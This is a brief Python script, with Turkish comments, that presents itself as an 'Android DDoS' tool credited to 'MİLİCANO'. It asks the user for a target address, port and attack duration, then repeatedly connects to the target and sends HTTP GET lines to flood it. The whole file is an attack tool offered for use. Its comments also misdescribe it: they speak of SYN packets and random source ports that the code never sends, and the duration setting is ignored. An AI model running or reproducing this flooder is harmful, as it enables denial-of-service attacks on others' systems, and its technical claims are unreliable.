print ("MİLİCANO tarafından Yapılmıştır Android DDoS")                        
                                                                                                                          
import socket
import random

def ddos(target, port, duration):
    # Hedef adres ve portu belirle
    target_ip = socket.gethostbyname(target)

    # Sürekli olarak socketler oluşturup hedefe SYN paketleri gönder
    while True:
        try:
            # Rastgele kaynak port numarası oluştur
            source_port = random.randint(1024, 65535)
            # Socket oluştur
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Hedefe bağlan
            s.connect((target_ip, port))
            # SYN paketi gönder
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target_ip, port))
            # Bağlantıyı kapat
            s.close()
            print("Paket gönderildi: ", source_port)
        except KeyboardInterrupt:
            break
        except socket.error:
            print("Bağlantı hatası!")
            break

# Kullanıcıdan hedef bilgilerini al
target = input("Hedef URL veya IP adresini girin: ")
port = int(input("Hedef portu girin: "))
duration = int(input("Saldırı süresini saniye cinsinden girin: "))

# DDoS saldırısını başlat
ddos(target, port, duration)